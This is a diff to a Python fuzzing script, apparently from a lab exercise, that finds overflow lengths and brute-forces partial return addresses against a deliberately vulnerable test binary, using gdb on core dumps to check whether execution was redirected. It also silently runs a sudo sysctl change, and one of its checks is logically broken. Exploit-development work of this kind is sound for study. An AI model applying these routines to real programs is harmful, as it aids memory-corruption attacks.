@@ -6,7 +6,8 @@ import struct
 import subprocess
 from io import BytesIO
 from numpy import longlong
-
+import resource
+from pygdbmi.gdbcontroller import GdbController
 import pexpect
 from fuzzingbook.Fuzzer import RandomFuzzer
 import os
@@ -17,6 +18,7 @@ from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBO
 from fuzzingbook.MutationFuzzer import MutationFuzzer
 from fuzzingbook.SearchBasedFuzzer import mutate
 import array as arr
+from pprint import pprint
 
 def cmd_line_call(name, args):
     child = pexpect.spawn(name, [args])
@@ -101,7 +103,23 @@ def breakSystemBeforeReturn(attackLen, fuzzedProgram, fuzzFile):
         print(returncode)
         print("Len=", currLen)
 
-
+#Make the address big endian
+#returns a normal view of the address into a string form
+def convertAddressToString(addr):
+    addr=str(addr)
+    aux=addr.replace("\\x",'')
+    aux=aux.replace("b'",'')
+    aux=aux.replace('\'','')
+    flipBytes=""
+    i=1
+    auxc=''
+    for c in reversed(aux):
+        if i%2==1:
+            auxc=c
+        else:
+            flipBytes=flipBytes+c+auxc
+        i=i+1
+    return flipBytes
 
 
 # partial address must contain full bytes
@@ -129,26 +147,55 @@ def attackWithPartialAddress(minBadLen, partialAddress, fuzzedProgram, fuzzFile)
         print(attackAddress)
         output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
         outputStr=str(output)
-        if "Secret is SECRET" in outputStr:
+        siaddr=si_addr().replace("0x",'')
+        myaddr=convertAddressToString(attackAddress)
+        #this may not always work
+        if siaddr!='0' and siaddr!=myaddr:
+            #execution got deflected to a valid address
             validAddresses.append(attackAddress)
-        print(outputStr)
-        print("Return code=", returncode)
+        else:
+            print("Not a valid address", attackAddress)
     validAddresses.remove(b'0')
-    print("All the valid addresses:")
+    print("All the valid addresses that deflect the program:")
     print(validAddresses)
+    print("A total of ",len(validAddresses))
+    
+ #Extract the si_addr value with the help of gdb   
+def si_addr():
+    output = subprocess.run(["gdb", fuzzedProgram, "core"],input="p $_siginfo\n\quit\n", capture_output=True, text=True, shell=False, check=True)
+    list_of_words = output.stdout.split()
+    try:
+        si_addr = list_of_words[list_of_words.index("si_addr") + 2].replace(",","")
+    except ValueError:
+        si_addr = list_of_words[list_of_words.index("{si_addr") + 2].replace(",","")
+    return si_addr
 
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
+    #Set the core file limit and path
+    resource.setrlimit(
+    resource.RLIMIT_CORE,
+    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
+    stream = os.popen('echo Returned output')
+    output = stream.read()
+    if output != "kernel.core_pattern = core":
+        os.system("sudo sysctl kernel.core_pattern=core")
+    #////////////////////////////////
+    
+    #Set variables for the fuzzed program
     seedInput = "abcdefghijklmno"
     fuzzFile = 'attack.bin'
     fuzzedProgram = "./vlad-iulian-pop-fuzzing/simple-vulnerable-buffer-overflow-from-file"
     mutations = 40
     sys.stdout = open('log.txt', 'w')
+    #sys.stderr = open('error.txt', 'w')
     minBadLen = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations)
     attackLen = int.from_bytes(attackSystem(minBadLen,fuzzedProgram,fuzzFile), "big")
     attackWithPartialAddress(minBadLen,'\x92\x04\x08', fuzzedProgram,fuzzFile)
-    # breakSystemBeforeReturn(attackLen, fuzzedProgram, fuzzFile)
+    #breakSystemBeforeReturn(attackLen, fuzzedProgram, fuzzFile)
     sys.stdout.close()
+    sys.stderr.close()
+
 
 
